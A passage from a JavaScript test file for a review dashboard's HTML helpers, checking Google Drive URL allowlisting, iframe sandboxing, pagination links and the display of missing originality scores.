  assert.equal(driveHref('https://drive.google.com/file/d/a/preview'), 'https://drive.google.com/file/d/a/preview');
  assert.equal(driveHref('https://evil.example/drive.google.com/'), '');
  assert.equal(driveHref('http://drive.google.com/x'), '');
  const html = clipItem({ created_clip_id: 'c1', google_drive_url: 'https://lookalike.example/preview' });
  assert.doesNotMatch(html, /<iframe/);
  const ok = clipItem({ created_clip_id: 'c1', google_drive_url: 'https://drive.google.com/file/d/a/preview' });
  assert.match(ok, /sandbox="allow-scripts allow-same-origin allow-presentation"/);
  assert.doesNotMatch(ok, /allow-top-navigation/);
});

test('a page past the end of a queue offers a way back rather than claiming it is empty', () => {
  const html = clipQueue([], { page: { offset: 50, limit: 25, total: 12 } });
  assert.match(html, /past the end/);
  assert.match(html, /href="\/">Back to the start/);
  assert.doesNotMatch(html, /Nothing awaiting review/);
  assert.match(momentQueue([], { page: { offset: 25, limit: 25, total: 0 } }), /href="\/moments"/);
});

test('a missing originality score is not shown as moderate risk', () => {
  const html = momentQueue([{ clip_moment_id: 'm1', originality_score: null }]);
  assert.doesNotMatch(html, /originality moderate/);
  assert.match(momentQueue([{ clip_moment_id: 'm1', originality_score: 3 }]), /originality moderate/);
});

test('the pipeline nav item carries no count it cannot back', () => {
  const html = navBar({ alarms: 4, clips: 2 }, '/');
  assert.match(html, /<span>Pipeline<\/span><\/a>/);
});

test('the pager handles the middle page in both directions', () => {
  const middle = pager({ path: '/', offset: 25, limit: 25, total: 60 });
  assert.match(middle, /offset=0">newer/);
  assert.match(middle, /offset=50">older/);
  assert.match(pager({ path: '/', offset: 50, limit: 25, total: 60 }), /offset=25">newer/);
});
